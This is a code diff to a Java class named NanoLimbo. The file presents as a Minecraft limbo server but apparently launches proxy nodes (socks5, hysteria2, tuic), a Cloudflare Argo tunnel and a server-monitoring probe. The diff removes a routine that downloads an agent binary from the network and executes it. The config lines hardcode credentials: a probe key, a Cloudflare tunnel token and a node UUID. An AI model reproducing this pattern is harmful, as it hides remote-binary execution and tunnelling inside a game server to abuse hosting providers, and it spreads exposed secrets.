@@ -34,19 +34,14 @@ public final class NanoLimbo {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
-    private static Process komariProcess;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
-        "KOMARI_ENDPOINT", "KOMARI_TOKEN"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
-    
-    // NOTE: komari-agent 版本，更新时只需修改此处
-    private static final String KOMARI_AGENT_VERSION = "1.1.93";
     
     
     public static void main(String[] args) {
@@ -79,13 +74,6 @@ public final class NanoLimbo {
             clearConsole();
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
-        }
-        
-        // NOTE: 启动 Komari 探针 agent，使用原生 WebSocket/HTTP 协议上报监控数据
-        try {
-            runKomariAgent();
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing Komari Agent: " + e.getMessage() + ANSI_RESET);
         }
         
         // start game
@@ -137,12 +125,12 @@ public final class NanoLimbo {
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "2ac71f63-0681-4d39-92b9-bc4b120ee825"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
         envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
-        envVars.put("NEZHA_SERVER", "");        // 已弃用，探针已改用 Komari，此处留空
-        envVars.put("NEZHA_PORT", "");          // 已弃用，探针已改用 Komari，此处留空
-        envVars.put("NEZHA_KEY", "");           // 已弃用，探针已改用 Komari，此处留空
+        envVars.put("NEZHA_SERVER", "komari.930128.xyz");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
+        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
+        envVars.put("NEZHA_KEY", "jssDs2t9IQpodDpw3HSF4x");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
         envVars.put("ARGO_PORT", "8090");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
         envVars.put("ARGO_DOMAIN", "freezehost.aov.gv.uy");        // argo固定隧道隧道域名
-        envVars.put("ARGO_AUTH", "eyJhIjoiZDRhZWU4NjcwMzE1ZmE1NTU3ZjkxMzlmNTBmNmRlZDciLCJ0IjoiYWI1ZjQyYjUtYzVmMy00OTk3LTgzYTAtZDkzM2EwMjUxNDIzIiwicyI6Ik5UZzNZbUpqTXpZdE9ESTNPUzAwTmpReUxXSTNNamt0T1dOak1qQmxOVEJoTjJRMSJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
+        envVars.put("ARGO_AUTH", "eyJhIjoiZDRhZWU4NjcwMzE1ZmE1NTU3ZjkxMzlmNTBmNmRlZDciLCJ0IjoiMmY1OWViZWUtZTNhMC00MmI3LWJmNWMtOTQ0MmU5ZmRiZDNjIiwicyI6Ik1qVmhNVEEyTkdZdE1EQTVNeTAwT0dRNExUaG1aamN0T0RZMk56UXpaV1ExTlRJNSJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
         envVars.put("S5_PORT", "10675");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
         envVars.put("HY2_PORT", "8745");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
         envVars.put("TUIC_PORT", "10675");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
@@ -156,9 +144,6 @@ public final class NanoLimbo {
         envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
         envVars.put("NAME", "");               // 节点备注名称
         envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
-        // NOTE: Komari 探针配置，在面板添加节点后获取 endpoint 和 token
-        envVars.put("KOMARI_ENDPOINT", "https://komari.930128.xyz"); // Komari 面板地址，格式：https://your-domain.com 或 http://ip:25774
-        envVars.put("KOMARI_TOKEN", "jssDs2t9IQpodDpw3HSF4x");        // Komari 节点 token，在面板「添加节点」后获取
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -217,81 +202,7 @@ public final class NanoLimbo {
         return path;
     }
     
-    /**
-     * 下载并启动 Komari Agent 二进制文件
-     * Komari 使用 WebSocket + HTTP 协议上报监控数据，与哪吒的 gRPC 协议不同
-     */
-    private static void runKomariAgent() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
-        
-        String endpoint = envVars.getOrDefault("KOMARI_ENDPOINT", "");
-        String token = envVars.getOrDefault("KOMARI_TOKEN", "");
-        
-        if (endpoint.isEmpty() || token.isEmpty()) {
-            System.out.println(ANSI_RED + "Komari Agent: KOMARI_ENDPOINT or KOMARI_TOKEN is empty, skipping..." + ANSI_RESET);
-            return;
-        }
-        
-        Path agentPath = getKomariAgentPath();
-        
-        // NOTE: 使用环境变量方式传入配置，避免命令行参数暴露敏感信息
-        ProcessBuilder pb = new ProcessBuilder(
-            agentPath.toString(),
-            "-e", endpoint,
-            "-t", token,
-            "--disable-web-ssh"  // 安全起见，禁用远程控制功能
-        );
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        
-        komariProcess = pb.start();
-        System.out.println(ANSI_GREEN + "Komari Agent started, reporting to: " + endpoint + ANSI_RESET);
-    }
-    
-    /**
-     * 根据系统架构下载对应的 komari-agent 二进制文件
-     * 下载地址基于 GitHub Releases
-     */
-    private static Path getKomariAgentPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String archSuffix;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            archSuffix = "linux-amd64";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            archSuffix = "linux-arm64";
-        } else if (osArch.contains("arm")) {
-            archSuffix = "linux-arm";
-        } else if (osArch.contains("386") || osArch.contains("i386") || osArch.contains("i686")) {
-            archSuffix = "linux-386";
-        } else {
-            throw new RuntimeException("Komari Agent: Unsupported architecture: " + osArch);
-        }
-        
-        String url = String.format(
-            "https://github.com/komari-monitor/komari-agent/releases/download/%s/komari-agent-%s",
-            KOMARI_AGENT_VERSION, archSuffix
-        );
-        
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
-        if (!Files.exists(path)) {
-            System.out.println(ANSI_GREEN + "Downloading Komari Agent v" + KOMARI_AGENT_VERSION + " (" + archSuffix + ")..." + ANSI_RESET);
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission for komari-agent");
-            }
-        }
-        return path;
-    }
-    
     private static void stopServices() {
-        if (komariProcess != null && komariProcess.isAlive()) {
-            komariProcess.destroy();
-            System.out.println(ANSI_RED + "Komari Agent process terminated" + ANSI_RESET);
-        }
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
             System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
